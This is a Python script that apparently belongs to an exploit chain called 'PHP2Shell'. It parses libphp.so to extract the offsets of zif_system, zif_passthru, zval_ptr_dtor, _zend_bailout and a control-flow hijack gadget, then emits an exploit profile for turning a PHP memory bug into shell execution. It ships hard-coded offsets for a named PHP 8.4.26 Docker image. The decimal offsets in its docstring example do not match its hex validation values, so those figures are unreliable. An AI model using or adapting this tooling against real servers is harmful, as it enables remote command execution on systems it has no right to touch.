#!/usr/bin/env python3
"""Extract PHP2Shell terminal-stage offsets from a libphp.so ELF binary.

The three-stage PHP2Shell chain needs five build-specific offsets inside the
loaded libphp DSO:

  zval_ptr_dtor     leaked through the phase-2 Set-Cookie pDestructor slot;
  zif_system        fallback system() carrier;
  zif_passthru      clean two-callback carrier, first callback;
  _zend_bailout     clean two-callback carrier, second callback;
  dispatcher gadget ``mov rdi,[rdi+0x28]; test rdi,rdi; je +7;
                    jmp [rdi+0x20]`` (mysqlnd res_data_seek site).

The first four are ELF symbols.  The gadget is found by its exact byte
pattern inside an executable section.  Everything else in an ExploitProfile
(heap geometry, request shapes) is a property of the PHP allocator plus the
ini configuration, not of symbol addresses, and is handled separately.

Usage:

  python3 libphp_offsets.py /path/to/libphp.so [--php-version 8.4.26]

Output: one JSON object on stdout suitable for ``--profile-json``.  The
extractor never executes the target binary.

Example (validated on php:8.4.26-apache-bookworm):

  {
    "name": "php-8.4.26-amd64",
    "zval_ptr_dtor_offset": 6612608,
    "zif_system_offset": 4567728,
    "zif_passthru_offset": 4567744,
    "zend_bailout_offset": 1740086,
    "terminal_dispatch_offset": 5138521
  }
"""

from __future__ import annotations

import argparse
import hashlib
import json
import struct
import sys
from pathlib import Path


class ExtractError(RuntimeError):
    pass


# mov rdi,[rdi+0x28]; test rdi,rdi; je +7; jmp [rdi+0x20]
GADGET_PATTERN = bytes.fromhex("48 8b 7f 28 48 85 ff 74 07 ff 67 20")
GADGET_JMP_OFFSET = 9

SHT_SYMTAB = 2
SHT_STRTAB = 3
SHF_EXECINSTR = 0x4


def read_elf(data: bytes) -> dict:
    if len(data) < 64 or data[:4] != b"\x7fELF":
        raise ExtractError("not an ELF file")
    if data[4] != 2:
        raise ExtractError("only ELF64 is supported")
    if data[5] != 1:
        raise ExtractError("only little-endian ELF is supported")
    (
        _e_type,
        _e_machine,
        _e_version,
        _e_entry,
        _e_phoff,
        e_shoff,
        _e_flags,
        _e_ehsize,
        _e_phentsize,
        _e_phnum,
        e_shentsize,
        e_shnum,
        e_shstrndx,
    ) = struct.unpack_from("<HHIQQQIHHHHHH", data, 16)
    sections = []
    for index in range(e_shnum):
        offset = e_shoff + index * e_shentsize
        if offset + e_shentsize > len(data):
            raise ExtractError("truncated section header table")
        (
            sh_name,
            sh_type,
            sh_flags,
            sh_addr,
            sh_offset,
            sh_size,
            sh_link,
            _sh_info,
            _sh_addralign,
            sh_entsize,
        ) = struct.unpack_from("<IIQQQQIIQQ", data, offset)
        sections.append(
            {
                "name_off": sh_name,
                "type": sh_type,
                "flags": sh_flags,
                "addr": sh_addr,
                "offset": sh_offset,
                "size": sh_size,
                "link": sh_link,
                "entsize": sh_entsize,
            }
        )
    if e_shstrndx >= len(sections):
        raise ExtractError("invalid section-name string table index")
    shstr = sections[e_shstrndx]
    for section in sections:
        section["name"] = read_cstr(data, shstr["offset"] + section["name_off"])
    return {"sections": sections}


def read_cstr(data: bytes, offset: int) -> str:
    end = data.find(b"\x00", offset)
    if end < 0:
        end = len(data)
    return data[offset:end].decode("utf-8", "replace")


def extract_symbols(data: bytes, elf: dict) -> dict[str, int]:
    symbols: dict[str, int] = {}
    for section in elf["sections"]:
        if section["type"] != SHT_SYMTAB:
            continue
        strtab = elf["sections"][section["link"]]
        strtab_data = data[strtab["offset"] : strtab["offset"] + strtab["size"]]
        entries = section["size"] // section["entsize"] if section["entsize"] else 0
        for index in range(entries):
            offset = section["offset"] + index * section["entsize"]
            if offset + section["entsize"] > len(data):
                break
            st_name, _st_info, _st_other, _st_shndx, st_value, _st_size = (
                struct.unpack_from("<IBBHQQ", data, offset)
            )
            if not st_name or not st_value:
                continue
            name = read_cstr(strtab_data, st_name)
            if name:
                symbols[name] = st_value
    return symbols


def find_gadget(data: bytes, elf: dict) -> int:
    matches: list[int] = []
    for section in elf["sections"]:
        if not section["flags"] & SHF_EXECINSTR or not section["size"]:
            continue
        blob = data[section["offset"] : section["offset"] + section["size"]]
        start = 0
        while True:
            found = blob.find(GADGET_PATTERN, start)
            if found < 0:
                break
            # Symbol values are virtual addresses; report the gadget the
            # same way so the profile stays consistent with st_value.
            matches.append(section["addr"] + found + GADGET_JMP_OFFSET)
            start = found + 1
    if not matches:
        raise ExtractError("dispatcher gadget byte pattern not found")
    if len(set(matches)) != 1:
        raise ExtractError(
            f"dispatcher gadget pattern is ambiguous: {[hex(m) for m in matches]}"
        )
    return matches[0]


WANTED_SYMBOLS = {
    "zval_ptr_dtor_offset": "zval_ptr_dtor",
    "zif_system_offset": "zif_system",
    "zif_passthru_offset": "zif_passthru",
    "zend_bailout_offset": "_zend_bailout",
}


def extract(path: Path, php_version: str | None) -> dict:
    data = path.read_bytes()
    elf = read_elf(data)
    symbols = extract_symbols(data, elf)

    missing = [
        f"{field} (symbol {name!r})"
        for field, name in WANTED_SYMBOLS.items()
        if name not in symbols
    ]
    if missing:
        raise ExtractError("missing symbols: " + ", ".join(missing))

    profile: dict[str, object] = {
        "libphp_sha256": hashlib.sha256(data).hexdigest(),
    }
    for field, name in WANTED_SYMBOLS.items():
        profile[field] = symbols[name]
    profile["terminal_dispatch_offset"] = find_gadget(data, elf)

    if php_version is None:
        php_version = None
    if php_version:
        profile["php_version"] = php_version
        profile["name"] = f"php-{php_version}-amd64"
        profile["description"] = (
            f"Profile generated from libphp.so (PHP {php_version}, amd64) by "
            "libphp_offsets.py; heap geometry inherited from the "
            "php-8.4.26-amd64 calibration and expected to match official "
            "php:<version>-apache-bookworm images with the documented ini profile"
        )
    return profile


def guess_php_version(symbols: dict[str, int]) -> str | None:
    """Reserved for future version inference; currently unused."""

    return None


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Extract PHP2Shell offsets from a libphp.so ELF binary"
    )
    parser.add_argument("libphp", type=Path, help="path to libphp.so")
    parser.add_argument(
        "--php-version",
        help="tag the generated profile with this PHP version (e.g. 8.4.25)",
    )
    parser.add_argument(
        "--validate-8426",
        action="store_true",
        help="assert the known php:8.4.26-apache-bookworm offsets",
    )
    arguments = parser.parse_args(argv)
    try:
        profile = extract(arguments.libphp, arguments.php_version)
    except (OSError, ExtractError) as error:
        print(f"[-] {error}", file=sys.stderr)
        return 2
    if arguments.validate_8426:
        expected = {
            "zval_ptr_dtor_offset": 0x64EB60,
            "zif_system_offset": 0x45A3B0,
            "zif_passthru_offset": 0x45A3C0,
            "zend_bailout_offset": 0x1A9936,
            "terminal_dispatch_offset": 0x4E5799,
        }
        for key, value in expected.items():
            if profile[key] != value:  # type: ignore[index]
                print(
                    f"[-] validation failed: {key}={profile[key]:#x} != {value:#x}",  # type: ignore[index]
                    file=sys.stderr,
                )
                return 3
        print("[+] php:8.4.26-apache-bookworm offsets validated", file=sys.stderr)
    print(json.dumps(profile, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
